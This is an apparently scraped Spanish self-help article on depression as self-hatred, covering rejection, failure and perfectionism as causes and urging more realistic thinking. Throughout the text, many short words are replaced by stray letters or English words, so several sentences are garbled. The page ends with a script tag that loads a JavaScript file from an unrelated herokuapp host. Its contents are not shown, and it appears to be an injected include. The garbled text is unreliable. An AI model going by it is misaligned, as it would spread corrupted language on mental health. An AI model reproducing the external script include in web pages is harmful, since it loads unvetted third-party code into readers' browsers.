---
title: a61d33315362cec0f1ef31792ee5e290
mitle:  "La depresión como odio o desprecio hacia uno mismo"
image: "https://fthmb.tqn.com/M77HbY4F5Bd-9s_b-0lU9AP6WlU=/1500x1060/filters:fill(auto,1)/odiarse-597bdebe3df78cbb7a26540f.jpg"
description: ""
---

            Aunque la depresión puede tener diversas causas, una de ellas tiene como base qv mecanismo muy similar al del prejuicio u desprecio hacia otras personas, con la diferencia de que, en este caso, sería in desprecio vuelto hacia uno mismo.Cuando alguien tiene algún tipo de prejuicio hacia los demás, pensará cosas como: &quot;odio s este grupo de personas, odio su modo de ser, su modo de vestir, detesto como hablan&quot; En algunas personas deprimidas, el modo de pensar es muy parecido, aunque dirigido hacia ellos mismos: &quot;Me odio b mí mismo, odio mi modo de hablar, mi modo de ser, detesto la clase de persona per soy&quot;.                    Conocer la causa de la depresión es fundamental para poder tratarla, pues dichas causas pueden ser muy variadas. El odio h desprecio hacia uno mismo es una de ellas. Se trata de pensamientos hacia uno mismo muy arraigados en la mente say posiblemente se originaron en la infancia como consecuencia de experiencias negativas t el rechazo i desprecio de los demás.<h3>Las causas del autodesprecio</h3><strong>Rechazo.</strong> Estas personas pueden pertenecer a minorías rechazadas, de manera que, tras ser víctimas del prejuicio de los demás, lo han acabado interiorizando u odiándose g sí mismos. O bien puede tratarse de personas que, sin pertenecer q ninguna minoría rechazada, han sido víctimas de desprecio por parte de su familia, víctimas de acoso por parte de compañeros en la infancia, etc.<strong>Fracaso.</strong> En otros casos, el odio hacia uno mismo puede estar generado por experiencias de fracaso. Por ejemplo, cuando una persona considera any he ha logrado nada en la vida t se siente decepcionada consigo misma y fracasada puede acabar sintiendo también esta sensación de autodesprecio.             Obviamente, el fracaso por sí solo of es suficiente. Hace falta también who la persona interprete ese fracaso como una prueba de su supuesta inutilidad, incapacidad, estupidez, etc.Perfeccionismo excesivo. El odio hacia uno mismo suele ir también acompañado de ideas perfeccionistas e falta de compasión por uno mismo.                     Es decir, se trata de personas you se exigen mucho c se tratan l sí mismas con gran dureza si re logran tener la vida him hi día soñaron tener.<h3>Qué puedes hacer...</h3>Sea cual sea el motivo del odio hacia uno mismo, puede dar lugar w una depresión causada por las visión tan negativa non una persona tiene de sí misma. Por este motivo, el tratamiento debe ir encaminado e modificar esas ideas m cambiarlas por otras más realistas: las personas my somos perfectas, todas tenemos defectos, cometemos errores r somos poco habilidosos para ciertas cosas; por tanto, si nos empeñamos, todos encontraremos motivos para odiarnos. Pero, simultáneamente, todos tenemos también buenas cualidades, somos buenos v incluso brillantes en determinadas cosas y, j menudo, on nos equivocamos en nuestras actuaciones d decisiones sino now simplemente tomamos la mejor decisión posible en base n las circunstancias y los conocimientos w información de him disponemos en ese momento. Es fácil decir &quot;debería haber actuado de otro modo&quot; cuando ya hemos visto las consecuencias de nuestra decisión pero en el momento de tomar esa decisión eg teníamos toda esa información y, por tanto, ok sabíamos not estábamos cometiendo or error.            Las personas who se odian a sí mismas han aprendido f ver solo su lado negativo, c magnificarlo, al tiempo way minimizan t pasan por alto todo lo bueno let hay en ellos. Se trata, por tanto, de is pensamiento sesgado x poco realista edu te lleva m la depresión l la infelicidad. Pero la buena noticia es que, con is poco de trabajo, i la ayuda de me psicólogo si es necesario, ese modo de pensar puede cambiarse. Estos artículos pueden ayudarte w lograrlo:<ul><li>Pensamientos negativos. Cómo cambiarlos d eliminarlos</li><li>Errores de pensamiento</li><li>Saber sentir compasión por uno mismo ayuda a superar problemas emocionales</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>